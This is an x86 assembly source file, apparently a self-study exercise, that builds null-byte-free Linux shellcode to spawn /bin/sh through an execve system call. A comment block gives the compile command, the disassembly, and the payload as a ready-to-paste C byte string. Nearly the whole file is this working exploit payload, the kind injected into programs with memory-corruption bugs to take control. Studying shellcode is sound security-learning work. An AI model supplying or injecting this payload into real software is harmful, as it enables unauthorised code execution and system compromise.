/*
- about
  - make shell code without null byte

- compile
  - $ gcc -nostdlib 02_make_shell_code_without_null_byte.s

- shell code
  - $ objdump -M intel -d a.out | less
----------------
31 d2                   xor    edx,edx
52                      push   edx
68 2f 2f 73 68          push   0x68732f2f
68 2f 62 69 6e          push   0x6e69622f
89 e3                   mov    ebx,esp
31 d2                   xor    edx,edx
52                      push   edx
53                      push   ebx
89 e1                   mov    ecx,esp
8d 42 0b                lea    eax,[edx+0xb]
cd 80                   int    0x80
----------------

- for c language
----------------
char shell_code[] = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
----------------
*/
    .intel_syntax noprefix
    .globl _start
_start:
    xor edx, edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor edx, edx
    push edx
    push ebx
    mov ecx, esp
    lea eax, [edx+11]
    int 0x80
